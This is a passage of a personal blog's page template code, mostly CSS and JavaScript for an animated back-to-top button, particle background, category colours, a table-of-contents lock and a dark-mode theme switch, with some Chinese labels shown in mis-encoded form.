  setTimeout(forceCategoryHoverEffects, 1000);
  hoverObserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'childList' && mutation.addedNodes.length > 0) setTimeout(forceCategoryHoverEffects, 100);
    });
  });
  hoverObserver.observe(document.body, { childList: true, subtree: true });
})();
</script>


<script src="/js/main-custom.ff65abb524f5e2b2b4cd9d24ab4f68c844f46989e54d5b820a1494ed1a208056.js" integrity="sha256-/2WrtST14rK0zZ0kq09oyET0aYnlTVuCChSU7RoggFY=" defer></script><script src="/js/terminal.3d63f2a720f09220def6ec539283a06dd56b5e750ce307dcc8676376fa76f71e.js" integrity="sha256-PWPypyDwkiDe9uxTkoOgbdVrXnUM4wfcyGdjdvp29x4=" defer></script>

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<style>
   
   
   
  @font-face {
   font-family: 'yuan';
   src: url('https://blog.928330.xyz/font/round.ttf') format('truetype');
  }

   
   
   
  :root {
   --base-font-family: 'yuan';
   --code-font-family: 'yuan';
  }

   
   
   
  #backTopBtn {
   position: fixed;
   bottom: 30px;
   right: 450px;
   z-index: 99;
   cursor: pointer;
   width: 32px;
   height: 32px;
   background-image: url('/icons/backTop.svg');
   background-size: cover;
   background-color: rgba(255, 255, 255, 0.9);
   border-radius: 50%;
   box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
   transform-origin: center center;
   animation: gentleFloat 3s ease-in-out infinite;
   overflow: visible;
  }

  [data-scheme="dark"] #backTopBtn {
   background-image: url('/icons/backTop-dark.svg') !important;
   background-color: rgba(0, 0, 0, 0.8) !important;
   box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
  }

  @media (prefers-color-scheme: dark) {
    #backTopBtn {
      background-image: url('/icons/backTop-dark.svg') !important;
      background-color: rgba(0, 0, 0, 0.8) !important;
      box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
    }
    .button-ripple {
      background-image: url('/icons/backTop-dark.svg') !important;
    }
  }

  html[data-scheme="dark"] #backTopBtn,
  body[data-scheme="dark"] #backTopBtn,
  .dark #backTopBtn,
  .dark-mode #backTopBtn {
    background-image: url('/icons/backTop-dark.svg') !important;
    background-color: rgba(0, 0, 0, 0.8) !important;
    box-shadow: 0 4px 20px rgba(255, 255, 255, 0.1) !important;
  }

  html[data-scheme="dark"] .button-ripple,
  body[data-scheme="dark"] .button-ripple,
  .dark .button-ripple,
  .dark-mode .button-ripple {
    background-image: url('/icons/backTop-dark.svg') !important;
  }

  [data-scheme="dark"] #backTopBtn::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 10px solid #ffffff;
    transform: translate(-50%, -50%);
    z-index: 1;
    display: var(--show-css-arrow, none);
  }

  #backTopBtn::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    border-left: 6px solid transparent;
    border-right: 6px solid transparent;
    border-bottom: 10px solid #000000;
    transform: translate(-50%, -50%);
    z-index: 1;
    display: var(--show-css-arrow, none);
  }

  @keyframes gentleFloat {
   0%, 100% { transform: translateY(0px); }
   50% { transform: translateY(-6px); }
  }

  .button-ripple {
   position: absolute;
   top: 0;
   left: 0;
   width: 32px;
   height: 32px;
   border-radius: 50%;
   background-image: url('/icons/backTop.svg');
   background-size: cover;
   background-repeat: no-repeat;
   background-position: center;
   pointer-events: none;
   z-index: -1;
   animation: buttonRippleExpand 2.5s linear infinite;
   transform-origin: center center;
   will-change: transform, opacity;
   backface-visibility: hidden;
   perspective: 1000px;
   contain: layout style;
   transform: translateZ(0);
   transition: animation-duration 0.3s ease;
   --show-css-arrow: none !important;
   opacity: var(--ripple-opacity, 0.8) !important;
  }

  [data-scheme="dark"] .button-ripple {
   background-image: url('/icons/backTop-dark.svg') !important;
   --show-css-arrow: none !important;
  }

  .button-ripple.hover-mode {
   animation-duration: 1s;
  }

  @keyframes buttonRippleExpand {
   0% { --ripple-opacity: 0.8; transform: scale(1); }
   50% { --ripple-opacity: 0.3; transform: scale(1.5); }
   100% { --ripple-opacity: 0; transform: scale(2.0); }
  }

  .button-tooltip {
   position: absolute;
   bottom: 45px;
   right: 450px;
   background: rgba(0, 0, 0, 0.8);
   color: white;
   padding: 8px 12px;
   border-radius: 6px;
   font-size: 12px;
   white-space: nowrap;
   opacity: 0;
   transform: translateY(10px);
   transition: all 0.3s ease;
   pointer-events: none;
   z-index: 100;
  }

  .button-tooltip.show {
   opacity: 1;
   transform: translateY(0);
  }

  .button-tooltip::after {
   content: '';
   position: absolute;
   top: 100%;
   left: 50%;
   transform: translateX(-50%);
   border: 5px solid transparent;
   border-top-color: rgba(0, 0, 0, 0.8);
  }

  #backTopBtn:hover {
   transform: translateY(-8px) scale(1.1);
   box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
   background-color: rgba(255, 255, 255, 1);
  }

  #backTopBtn.sprinting {
   animation: energyBurst 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
  }

  @keyframes energyBurst {
   0% {
     transform: scale(1) rotate(0deg);
     opacity: 1;
     filter: brightness(1) hue-rotate(0deg);
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   }
   100% {
     transform: scale(1) rotate(0deg);
     opacity: 1;
     filter: brightness(1) hue-rotate(360deg);
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
   }
  }

  #backTopBtn.reappearing {
   animation: reappear 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
  }

  #backTopBtn.exploding {
   animation: explosionTransition 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
   z-index: 1000;
  }

  #backTopBtn.exploding .button-ripple {
   opacity: 0;
   animation-play-state: paused;
  }

  @keyframes explosionTransition {
   0% { transform: scale(1.6); opacity: 1; }
   100% { transform: scale(1); opacity: 1; }
  }

  @keyframes reappear {
   0% { transform: scale(0.85); opacity: 0.7; }
   100% { transform: scale(1); opacity: 1; }
  }

  .particle {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 4px;
   height: 4px;
   background: radial-gradient(circle, #fff, #ffd700, #ff69b4, #87ceeb);
   border-radius: 50%;
   pointer-events: none;
   z-index: -2;
   animation: particleExplode 1s ease-out forwards;
  }

  @keyframes particleExplode {
   0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
   100% { transform: translate(-50%, -50%) scale(1) translate(var(--x), var(--y)); opacity: 0; }
  }

  .energy-wave {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 0;
   height: 0;
   border: 2px solid transparent;
   border-radius: 50%;
   pointer-events: none;
   z-index: -3;
   animation: energyWave 1.2s ease-out forwards;
  }

  @keyframes energyWave {
   0% { width: 0; height: 0; border-color: rgba(255, 215, 0, 0.8); opacity: 1; }
   100% { width: 120px; height: 120px; border-color: rgba(255, 215, 0, 0); opacity: 0; }
  }

  .hero-aura {
   position: absolute;
   top: 50%;
   left: 50%;
   width: 100%;
   height: 100%;
   border-radius: 50%;
   background: conic-gradient(from 0deg, #ffd700, #ff69b4, #87ceeb, #98fb98, #ffa07a, #ffd700);
   background-size: 200% 200%;
   pointer-events: none;
   z-index: -4;
   animation: heroAura 2s linear infinite;
   opacity: 0;
   transition: opacity 0.3s ease;
  }

  #backTopBtn.sprinting .hero-aura { opacity: 0.6; }

  @keyframes heroAura {
   0% { background-position: 0% 0%; transform: translate(-50%, -50%) rotate(0deg); }
   100% { background-position: 100% 100%; transform: translate(-50%, -50%) rotate(360deg); }
  }

   
   
   
  @media (max-width: 768px) {
    #backTopBtn {
         
        left: auto;  
        right: 20px !important; 
        bottom: 20px;
        width: 40px;  
        height: 40px;
         
        box-shadow: 0 0 12px rgba(0, 191, 255, 0.7);
    }
    
     
    .button-tooltip {
        left: auto !important;
        right: 20px !important;
        bottom: 65px;  
    }
  }
  
  @media (max-width: 480px) {
     #backTopBtn {
       left: 15px !important;
       right: auto !important;
       bottom: 15px;
       width: 26px;
       height: 26px;
     }
     .button-tooltip {
       left: 15px !important;
       right: auto !important;
       bottom: 31px;
     }
  }

  .no-text-selection {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
  }

   
   
   
  
  #rope-physics-container,
  #rope-svg-container {
    pointer-events: none; 
  }

  #pull-ring-physics {
    pointer-events: auto !important;
    touch-action: none; 
  }

   
  @media (max-width: 767px) {
    #rope-container,
    #rope-physics-container,
    #rope-svg-container,
    #pull-ring-physics {
      display: none !important;
      width: 0 !important;
      height: 0 !important;
      opacity: 0 !important;
      pointer-events: none !important;
    }
  }
  
  #rope-container {
    position: fixed;
    top: 0;
    left: 20px;
    z-index: 10002; 
    width: 50px;
    height: 100vh;
    pointer-events: none;
  }

   
   
   
  .highlight {
   max-height: 400px;
   overflow: hidden;
   position: relative;
   transition: max-height 0.3s ease-out;
  }

  .code-show {
   max-height: none !important;
  }

  .code-more-box {
   width: 100%;
   padding-top: 20px;
   background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0), #fff);
   position: absolute;
   left: 0;
   right: 0;
   bottom: 0;
   z-index: 1;
   text-align: center;
  }

  .code-more-btn {
   display: inline-block;
   padding: 5px 15px;
   background: #f0f0f5;
   border-radius: 5px;
   cursor: pointer;
   font-size: 0.9em;
  }

   
   
   
  #particles-js {
   position: fixed;
   top: 0;
   left: 0;
   width: 100vw;
   height: 100vh;
   z-index: -1;
   pointer-events: none;
  }
  
  #particles-js canvas {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    width: 100vw !important;
    height: 100vh !important;
  }

   
   
   
  .toc-lock-btn {
    position: absolute;
    top: 32px;
    right: 5px;
    width: 28px;
    height: 28px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    border-radius: 50%;
    transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    background: rgba(0, 0, 0, 0.05);
    color: rgba(0, 0, 0, 0.7);
    z-index: 100;
    border: 1px solid rgba(0, 0, 0, 0.1);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  }
  
  .toc-lock-btn:hover {
    background: rgba(0, 0, 0, 0.1);
    transform: scale(1.1);
    border-color: rgba(0, 0, 0, 0.2);
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
  }
  
  .toc-lock-btn:active {
    transform: scale(0.95);
  }
  
  .toc-lock-btn:focus {
    outline: none;
    border-color: rgba(0, 0, 0, 0.4);
    box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1), 0 2px 8px rgba(0, 0, 0, 0.1);
    background: rgba(0, 0, 0, 0.08);
  }
  
  .toc-lock-btn.locked {
    color: rgba(0, 0, 0, 0.9);
    background: rgba(0, 0, 0, 0.1);
    border-color: rgba(0, 0, 0, 0.3);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
  }
  
  .toc-lock-btn.locked:hover {
    background: rgba(0, 0, 0, 0.15);
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
  }
  
  .toc-lock-btn.locked .lock-icon.locked { display: block; }
  .toc-lock-btn.locked .lock-icon.unlocked { display: none; }
  .toc-lock-btn .lock-icon.locked { display: none; }
  .toc-lock-btn .lock-icon.unlocked { display: block; }
  
  .toc-lock-btn .lock-icon {
    width: 14px;
    height: 14px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    transition: all 0.3s ease;
  }
  
  .toc-lock-label {
    position: absolute;
    top: 38px;
    right: 28px;
    font-size: 16px;
    color: rgba(0, 0, 0, 0.6);
    font-weight: 700;
    z-index: 100;
    user-select: none;
    pointer-events: none;
    line-height: 1;
    display: flex;
    align-items: center;
  }

  [data-scheme="dark"] .toc-lock-btn {
    background: rgba(255, 255, 255, 0.05);
    border-color: rgba(255, 255, 255, 0.1);
    color: rgba(255, 255, 255, 0.7);
  }
  
  [data-scheme="dark"] .toc-lock-btn:hover {
    background: rgba(255, 255, 255, 0.1);
    border-color: rgba(255, 255, 255, 0.2);
    box-shadow: 0 4px 16px rgba(255, 255, 255, 0.15);
  }
  
  [data-scheme="dark"] .toc-lock-btn:focus {
    outline: none;
    border-color: rgba(255, 255, 255, 0.4);
    box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1), 0 2px 8px rgba(255, 255, 255, 0.1);
    background: rgba(255, 255, 255, 0.08);
  }
  
  [data-scheme="dark"] .toc-lock-btn.locked {
    color: rgba(255, 255, 255, 0.9);
    background: rgba(255, 255, 255, 0.1);
    border-color: rgba(255, 255, 255, 0.3);
    box-shadow: 0 2px 8px rgba(255, 255, 255, 0.2);
  }
  
  [data-scheme="dark"] .toc-lock-btn.locked:hover {
    background: rgba(255, 255, 255, 0.15);
    box-shadow: 0 4px 16px rgba(255, 255, 255, 0.25);
  }
  
  [data-scheme="dark"] .toc-lock-label {
    color: rgba(255, 255, 255, 0.6);
  }

  #TableOfContents[data-scrollspy-disabled="true"] { opacity: 0.8 !important; }
  #TableOfContents[data-scrollspy-disabled="true"] .active-class { display: block !important; opacity: 1 !important; }
  #TableOfContents[data-scrollspy-disabled="true"] a { cursor: pointer !important; }
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/matter-js/0.19.0/matter.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>

<div id="rope-container"></div>

<div id="particles-js"></div>

<script>
particlesJS('particles-js', {
  "particles": {
    "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
    "color": { "value": ["#888888", "#aaaaaa", "#cccccc", "#eeeeee"] },
    "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 } },
    "opacity": { "value": 0.5, "random": false, "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false } },
    "size": { "value": 2, "random": true, "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false } },
    "line_linked": { "enable": true, "distance": 150, "color": "#888888", "opacity": 0.4, "width": 1 },
    "move": { "enable": true, "speed": 2, "direction": "none", "random": false, "straight": false, "out_mode": "out", "bounce": false, "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } }
  },
  "interactivity": {
    "detect_on": "canvas",
    "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" }, "resize": true },
    "modes": { "grab": { "distance": 140, "line_linked": { "opacity": 1 } }, "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 }, "repulse": { "distance": 200, "duration": 0.4 }, "push": { "particles_nb": 4 }, "remove": { "particles_nb": 2 } }
  },
  "retina_detect": true
});
</script>

<script>
(function() {
  'use strict';
  const categoryColors = [
    '#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57',
    '#ff9ff3', '#54a0ff', '#5f27cd', '#00d2d3', '#ff9f43',
    '#10ac84', '#ff6348', '#a55eea', '#e17055', '#d63031',
    '#00b894', '#fdcb6e', '#6c5ce7', '#fd79a8', '#f39c12',
    '#e67e22', '#e74c3c', '#9b59b6', '#3498db', '#1abc9c',
    '#16a085', '#27ae60', '#2ecc71', '#f1c40f', '#e67e22'
  ];
  function hashString(str) {
    let hash = 0;
    if (str.length === 0) return hash;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash);
  }
  function assignCategoryColors() {
    const isArchivesPage = document.body.classList.contains('template-archives') || window.location.pathname.includes('/archives/');
    const isArticlePage = document.querySelector('#TableOfContents') || document.querySelector('.article-category');
    
    if (isArticlePage && !isArchivesPage) {
      const categoryLinks = document.querySelectorAll('.article-category a');
      categoryLinks.forEach((link, index) => {
        const href = link.getAttribute('href');
        const categoryName = href.split('/').pop() || href.split('/').slice(-2, -1)[0] || 'default';
        const hash = hashString(categoryName);
        const colorIndex = hash % categoryColors.length;
        const backgroundColor = categoryColors[colorIndex];
        link.style.setProperty('background-color', backgroundColor, 'important');
        link.style.setProperty('color', '#fff', 'important');
        link.addEventListener('mouseenter', function() { this.style.opacity = '0.8'; this.style.transform = 'scale(1.05)'; });
        link.addEventListener('mouseleave', function() { this.style.opacity = '1'; this.style.transform = 'scale(1)'; });
      });
    }
    if (!isArchivesPage) {
      const sidebarCategories = document.querySelectorAll('.widget.categories a, .widget.tagCloud a');
      sidebarCategories.forEach((link, index) => {
        const href = link.getAttribute('href');
        const categoryName = href.split('/').pop() || href.split('/').slice(-2, -1)[0] || 'default';
        const hash = hashString(categoryName);
        const colorIndex = hash % categoryColors.length;
        const backgroundColor = categoryColors[colorIndex];
        link.style.setProperty('background-color', backgroundColor, 'important');
        link.style.setProperty('color', '#fff', 'important');
        link.style.setProperty('border-radius', '6px', 'important');
        link.style.setProperty('padding', '8px 12px', 'important');
        link.style.setProperty('margin', '4px 0', 'important');
        link.style.setProperty('display', 'inline-block', 'important');
        link.style.setProperty('text-decoration', 'none', 'important');
        link.style.setProperty('transition', 'all 0.3s ease', 'important');
        link.addEventListener('mouseenter', function() { this.style.opacity = '0.8'; this.style.transform = 'scale(1.05)'; this.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.2)'; });
        link.addEventListener('mouseleave', function() { this.style.opacity = '1'; this.style.transform = 'scale(1)'; this.style.boxShadow = 'none'; });
      });
    }
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', assignCategoryColors); else assignCategoryColors();
  setTimeout(assignCategoryColors, 500);
  setTimeout(assignCategoryColors, 1000);
  setTimeout(assignCategoryColors, 2000);
  const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
        const hasNewCategories = Array.from(mutation.addedNodes).some(node => {
          return node.nodeType === 1 && (node.classList.contains('article-category') || node.querySelector('.article-category') || node.classList.contains('widget') || node.querySelector('.widget'));
        });
        if (hasNewCategories) { setTimeout(assignCategoryColors, 100); setTimeout(assignCategoryColors, 500); }
      }
    });
  });
  observer.observe(document.body, { childList: true, subtree: true });
})();
</script>

<script>
(function() {
  'use strict';
  function fixDarkModeToggleText() {
    const toggleBtn = document.getElementById('dark-mode-toggle');
    if (!toggleBtn) return;
    toggleBtn.classList.add('dark-mode-toggle-fix');
    const span = toggleBtn.querySelector('span');
    if (!span) return;
    function updateText() {
      const isDark = document.documentElement.dataset.scheme === 'dark';
      span.textContent = isDark ? 'äº®è‰²æ¨¡å¼' : 'æš—è‰²æ¨¡å¼';
    }
    updateText();
    function handleThemeChange() { setTimeout(updateText, 100); }
    window.addEventListener('onColorSchemeChange', handleThemeChange);
    const observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-scheme') handleThemeChange();
      });
    });
    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-scheme'] });
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', handleThemeChange);
    toggleBtn.addEventListener('click', function() { setTimeout(updateText, 200); });
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', fixDarkModeToggleText); else fixDarkModeToggleText();
  setTimeout(fixDarkModeToggleText, 1000);
  setTimeout(fixDarkModeToggleText, 2000);
})();
</script>

  <script>
  if (!document.getElementById('new-theme-switch')) {
    document.write(`
      <div id="new-theme-switch">
        <label class="theme-switch">
          <input type="checkbox" class="theme-switch__checkbox" id="theme-switch-checkbox">
          <div class="theme-switch__container">
            <div class="theme-switch__clouds"></div>
            <div class="theme-switch__stars-container">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 55" fill="none">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M135.831 3.00688C135.055 3.85027 134.111 4.29946 133 4.35447C134.111 4.40947 135.055 4.85867 135.831 5.71123C136.607 6.55462 136.996 7.56303 136.996 8.72727C136.996 7.95722 137.172 7.25134 137.525 6.59129C137.886 5.93124 138.372 5.39954 138.98 5.00535C139.598 4.60199 140.268 4.39114 141 4.35447C139.88 4.2903 138.936 3.85027 138.16 3.00688C137.384 2.16348 136.996 1.16425 136.996 0C136.996 1.16425 136.607 2.16348 135.831 3.00688ZM31 23.3545C32.1114 23.2995 33.0551 22.8503 33.8313 22.0069C34.6075 21.1635 34.9956 20.1642 34.9956 19C34.9956 20.1642 35.3837 21.1635 36.1599 22.0069C36.9361 22.8503 37.8798 23.2903 39 23.3545C38.2679 23.3911 37.5976 23.602 36.9802 24.0053C36.3716 24.3995 35.8864 24.9312 35.5248 25.5913C35.172 26.2513 34.9956 26.9572 34.9956 27.7273C34.9956 26.563 34.6075 25.5546 33.8313 24.7112C33.0551 23.8587 32.1114 23.4095 31 23.3545ZM0 36.3545C1.11136 36.2995 2.05513 35.8503 2.83131 35.0069C3.6075 34.1635 3.99559 33.1642 3.99559 32C3.99559 33.1642 4.38368 34.1635 5.15987 35.0069C5.93605 35.8503 6.87982 36.2903 8 36.3545C7.26792 36.3911 6.59757 36.602 5.98015 37.0053C5.37155 37.3995 4.88644 37.9312 4.52481 38.5913C4.172 39.2513 3.99559 39.9572 3.99559 40.7273C3.99559 39.563 4.38368 38.5546 2.83131 37.7112C2.05513 36.8587 1.11136 36.4095 0 36.3545ZM56.8313 24.0069C56.0551 24.8503 55.1114 25.2995 54 25.3545C55.1114 25.4095 56.0551 25.8587 56.8313 26.7112C57.6075 27.5546 57.9956 28.563 57.9956 29.7273C57.9956 28.9572 58.172 28.2513 58.5248 27.5913C58.8864 26.9312 59.3716 26.3995 59.9802 26.0053C60.5976 25.602 61.2679 25.3911 62 25.3545C60.8798 25.2903 59.9361 24.8503 59.1599 24.0069C58.3837 23.1635 57.9956 22.1642 57.9956 21C57.9956 22.1642 57.6075 23.1635 56.8313 24.0069ZM81 25.3545C82.1114 25.2995 83.0551 24.8503 83.8313 24.0069C84.6075 23.1635 84.9956 22.1642 84.9956 21C84.9956 22.1642 85.3837 23.1635 86.1599 24.0069C86.9361 24.8503 87.8798 25.2903 89 25.3545C88.2679 25.3911 87.5976 25.602 86.9802 26.0053C86.3716 26.3995 85.8864 26.9312 85.5248 27.5913C85.172 28.2513 84.9956 28.9572 84.9956 29.7273C84.9956 28.563 84.6075 27.5546 83.8313 26.7112C83.0551 25.8587 82.1114 25.4095 81 25.3545ZM136 36.3545C137.111 36.2995 138.055 35.8503 138.831 35.0069C139.607 34.1635 139.996 33.1642 139.996 32C139.996 33.1642 140.384 34.1635 141.16 35.0069C141.936 35.8503 142.88 36.2903 144 36.3545C143.268 36.3911 142.598 36.602 141.98 37.0053C141.372 37.3995 140.886 37.9312 140.525 38.5913C140.172 39.2513 139.996 39.9572 139.996 40.7273C139.996 39.563 139.607 38.5546 138.831 37.7112C138.055 36.8587 137.111 36.4095 136 36.3545ZM101.831 49.0069C101.055 49.8503 100.111 50.2995 99 50.3545C100.111 50.4095 101.055 50.8587 101.831 51.7112C102.607 52.5546 102.996 53.563 102.996 54.7273C102.996 53.9572 103.172 53.2513 103.525 52.5913C103.886 51.9312 104.372 51.3995 104.98 51.0053C105.598 50.602 106.268 50.3911 107 50.3545C105.88 50.2903 104.936 49.8503 104.16 49.0069C103.384 48.1635 102.996 47.1642 102.996 46C102.996 47.1642 102.607 48.1635 101.831 49.0069Z" fill="currentColor"></path>
              </svg>
            </div>
            <div class="theme-switch__circle-container">
              <div class="theme-switch__sun-moon-container">
                <div class="theme-switch__moon">
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                  <div class="theme-switch__spot"></div>
                </div>
              </div>
            </div>
          </div>
        </label>
        <div id="theme-switch-text" style="color: #fff; font-size: 14px; font-weight: 600; text-shadow: 0 1px 2px rgba(0,0,0,0.5); margin-top: 8px; text-align: center;">äº®è‰²æ¨¡å¼</div>
      </div>
    `);
  }
  </script>

<style>
   
  #new-theme-switch {
    position: fixed;
    bottom: 50px;
    left: 50px;
    z-index: 1000;
    text-align: center;
    width: fit-content;  
  }

  .theme-switch {
    --toggle-size: 20px;
    --container-width: 3.75em;
    --container-height: 1.7em;
    --container-radius: 4.2em;
    --container-light-bg: #3D7EAE;
    --container-night-bg: #1D1F2C;
    --circle-container-diameter: 2.25em;
    --sun-moon-diameter: 1.4em;
    --sun-bg: #ECCA2F;
    --moon-bg: #C4C9D1;
    --spot-color: #959DB1;
    --circle-container-offset: calc((var(--circle-container-diameter) - var(--container-height)) / 2 * -1);
    --stars-color: #fff;
    --clouds-color: #F3FDFF;
    --back-clouds-color: #AACADF;
    --transition: .5s cubic-bezier(0, -0.02, 0.4, 1.25);
    --circle-transition: .3s cubic-bezier(0, -0.02, 0.35, 1.17);
  }

   
  @media (max-width: 768px) {
    #new-theme-switch {
      left: auto !important;    
      right: 20px !important;   
      bottom: 20px !important;  
      transform: scale(0.8);    
      transform-origin: bottom right;  
      z-index: 9999 !important;  
    }
    
     
    #theme-switch-text {
      font-size: 12px !important;
      margin-top: 4px !important;
    }
  }

  .theme-switch, .theme-switch *, .theme-switch *::before, .theme-switch *::after {
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-size: var(--toggle-size);
  }

  .theme-switch__container {
    width: var(--container-width);
    height: var(--container-height);
    background-color: var(--container-light-bg);
    border-radius: var(--container-radius);
    overflow: hidden;
    cursor: pointer;
    -webkit-box-shadow: 0em -0.062em 0.062em rgba(0, 0, 0, 0.25), 0em 0.062em 0.125em rgba(255, 255, 255, 0.94);
    box-shadow: 0em -0.062em 0.062em rgba(0, 0, 0, 0.25), 0em 0.062em 0.125em rgba(255, 255, 255, 0.94);
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
    position: relative;
  }

  .theme-switch__container::before {
    content: "";
    position: absolute;
    z-index: 1;
    inset: 0;
    -webkit-box-shadow: 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset, 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset;
    box-shadow: 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset, 0em 0.05em 0.187em rgba(0, 0, 0, 0.25) inset;
    border-radius: var(--container-radius)
  }

  .theme-switch__checkbox { display: none; }

  .theme-switch__circle-container {
    width: var(--circle-container-diameter);
    height: var(--circle-container-diameter);
    background-color: rgba(255, 255, 255, 0.1);
    position: absolute;
    left: var(--circle-container-offset);
    top: var(--circle-container-offset);
    border-radius: var(--container-radius);
    -webkit-box-shadow: inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), 0 0 0 0.625em rgba(255, 255, 255, 0.1), 0 0 0 1.25em rgba(255, 255, 255, 0.1);
    box-shadow: inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), inset 0 0 0 3.375em rgba(255, 255, 255, 0.1), 0 0 0 0.625em rgba(255, 255, 255, 0.1), 0 0 0 1.25em rgba(255, 255, 255, 0.1);
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-transition: var(--circle-transition);
    -o-transition: var(--circle-transition);
    transition: var(--circle-transition);
    pointer-events: none;
  }

  .theme-switch__sun-moon-container {
    pointer-events: auto;
    position: relative;
    z-index: 2;
    width: var(--sun-moon-diameter);
    height: var(--sun-moon-diameter);
    margin: auto;
    border-radius: var(--container-radius);
    background-color: var(--sun-bg);
    -webkit-box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #a1872a inset;
    box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #a1872a inset;
    -webkit-filter: drop-shadow(0.062em 0.125em 0.125em rgba(0, 0, 0, 0.25)) drop-shadow(0em 0.062em 0.125em rgba(0, 0, 0, 0.25));
    filter: drop-shadow(0.062em 0.125em 0.125em rgba(0, 0, 0, 0.25)) drop-shadow(0em 0.062em 0.125em rgba(0, 0, 0, 0.25));
    overflow: hidden;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
  }

  .theme-switch__moon {
    -webkit-transform: translateX(100%);
    -ms-transform: translateX(100%);
    transform: translateX(100%);
    width: 100%;
    height: 100%;
    background-color: var(--moon-bg);
    border-radius: inherit;
    -webkit-box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #969696 inset;
    box-shadow: 0.062em 0.062em 0.062em 0em rgba(254, 255, 239, 0.61) inset, 0em -0.062em 0.062em 0em #969696 inset;
    -webkit-transition: var(--transition);
    -o-transition: var(--transition);
    transition: var(--transition);
    position: relative;
  }

  .theme-switch__spot {
    position: absolute;
    top: 0.75em;
    left: 0.312em;
    width: 0.75em;
    height: 0.75em;
    border-radius: var(--container-radius);
    background-color: var(--spot-color);
    -webkit-box-shadow: 0em 0.0312em 0.062em rgba(0, 0, 0, 0.25) inset;
    box-shadow: 0em 0.0312em 0.062em rgba(0, 0, 0, 0.25) inset;
  }

